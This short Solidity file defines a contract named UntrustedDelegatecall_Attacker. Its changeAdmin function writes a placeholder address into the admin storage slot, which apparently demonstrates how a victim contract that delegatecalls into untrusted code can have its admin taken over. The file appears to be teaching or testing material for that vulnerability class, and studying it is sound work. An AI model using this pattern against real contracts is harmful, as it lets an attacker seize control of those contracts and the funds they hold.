// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

contract UntrustedDelegatecall_Attacker {
	address admin;

	function changeAdmin() external {
		admin = address(0xDeaDbeefdEAdbeefdEadbEEFdeadbeEFdEaDbeeF);
	}
}
